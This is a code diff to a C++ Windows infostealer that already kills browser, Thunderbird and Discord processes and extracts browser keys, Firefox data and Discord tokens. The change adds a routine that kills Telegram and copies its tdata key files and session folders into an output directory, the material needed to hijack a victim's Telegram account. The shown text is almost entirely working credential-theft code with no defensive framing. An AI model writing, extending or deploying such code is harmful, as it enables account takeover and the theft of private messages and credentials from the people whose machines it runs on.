@@ -53,6 +53,7 @@ void set_resume_flag(uint32_t thread_id);
 bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name);
+void extract_telegram_session();
 
 int main() {
     std::vector<BrowserConfig> configs = {
@@ -179,6 +180,7 @@ int main() {
     kill_processes_by_name("librewolf.exe");
     kill_processes_by_name("thunderbird.exe");
     kill_processes_by_name("discord.exe");
+    kill_processes_by_name("Telegram.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
@@ -321,6 +323,8 @@ int main() {
             }
         }
     }
+
+    extract_telegram_session();
 
     return 0;
 }
@@ -1110,6 +1114,66 @@ bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
     f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
 
     return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
+}
+
+bool is_hex_string(const std::string& s) {
+    if (s.length() != 16) return false;
+    return std::all_of(s.begin(), s.end(), [](unsigned char c) { return std::isxdigit(c); });
+}
+
+void extract_telegram_session() {
+    wchar_t* appdata;
+    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;
+
+    fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata";
+    CoTaskMemFree(appdata);
+
+    if (!fs::exists(tdata_path)) return;
+
+    fs::path output_root("Telegram");
+    fs::path output_tdata = output_root / "tdata";
+    fs::create_directories(output_tdata);
+
+    try {
+        // Essential root files
+        std::vector<std::string> root_files = {"key_datas", "map0", "map1", "settingss"};
+        for (const auto& f : root_files) {
+            fs::path src = tdata_path / f;
+            if (fs::exists(src)) {
+                fs::copy(src, output_tdata / f, fs::copy_options::overwrite_existing);
+            }
+        }
+
+        // Session folders (16-char hex)
+        for (const auto& entry : fs::directory_iterator(tdata_path)) {
+            if (entry.is_directory()) {
+                std::string folder_name = entry.path().filename().string();
+                if (is_hex_string(folder_name)) {
+                    fs::path dest = output_tdata / folder_name;
+                    fs::create_directories(dest);
+
+                    // Copy everything inside the hex folder (usually small session files)
+                    for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path())) {
+                        auto rel_path = fs::relative(sub_entry.path(), entry.path());
+                        fs::path sub_dest = dest / rel_path;
+
+                        if (sub_entry.is_directory()) {
+                            fs::create_directories(sub_dest);
+                        } else {
+                            // Avoid copying large log files or dumps if they exist here
+                            std::string filename = sub_entry.path().filename().string();
+                            if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
+                                fs::copy(sub_entry.path(), sub_dest, fs::copy_options::overwrite_existing);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        std::cout << "Telegram session extraction complete. Saved to Telegram/tdata" << std::endl;
+    } catch (const std::exception& e) {
+        std::cerr << "Telegram extraction error: " << e.what() << std::endl;
+    }
 }
 
 void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name) {
